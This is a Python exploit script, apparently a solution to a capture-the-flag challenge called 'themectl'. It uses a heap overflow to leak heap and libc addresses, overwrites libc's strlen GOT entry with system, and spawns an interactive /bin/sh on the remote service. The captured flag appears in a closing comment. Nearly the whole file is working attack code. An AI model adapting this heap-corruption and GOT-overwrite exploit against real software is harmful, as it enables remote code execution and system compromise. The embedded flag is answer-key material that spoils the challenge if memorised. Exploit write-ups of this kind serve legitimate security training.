#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './themectl'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challs.actf.co', 'port':31325})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    t = ThemeCtl(conn)

    t.register(b'a'*8, b'pass', 1)
    t.edit(0, b'0'*0x28+p64(0xbf1))
    t.logout()

    t.register(b'b'*8, b'pass', 0x1a)
    t.edit(0, b'1'*8)
    t.logout()

    t.login(b'a'*8, b'pass')
    t.edit(0, b'2'*0x28 + flat(0xf1, 0x100))
    t.logout()

    t.login(b'b'*8, b'pass')
    addr_heap_base = u(t.view(0)) - 0x520
    info('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))
    t.edit(1, p64(addr_heap_base + 0x628))
    t.logout()

    t.register(b'c'*8, b'pass', 0x150)
    t.logout()

    t.login(b'b'*8, b'pass')
    addr_libc_mainarena = u(t.view(0x2d)) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_got        = libc.sep_section['.got.plt']
    addr_libc_got_strlen = addr_libc_got + 0x98
    addr_libc_system     = libc.sep_function['system']

    t.edit(1,    b'/bin/sh\x00' + p64(addr_libc_got_strlen))
    t.edit(0x2e, p64(addr_libc_system))
    t.view(1, False)

class ThemeCtl:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def register(self, name, passwd, themes):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'Username: ', name)
        self.sendlineafter(b'password: ', passwd)
        self.sendlineafter(b'like? ', str(themes).encode())

    def login(self, name, passwd):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'Username: ', name)
        self.sendlineafter(b'password: ', passwd)

    def edit(self, idx, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'edit? ', str(idx).encode())
        self.sendlineafter(b'idea: ', data)

    def view(self, idx, wait=True):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'view? ', str(idx).encode())
        return self.recvuntil(b'\n--- OPTIONS ---', drop=True) if wait else None

    def logout(self):
        self.sendlineafter(b'> ', b'4')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # actf{forget_picking_themes_maybe_we_should_think_of_challenges_first}

if __name__=='__main__':
    main()

#==========
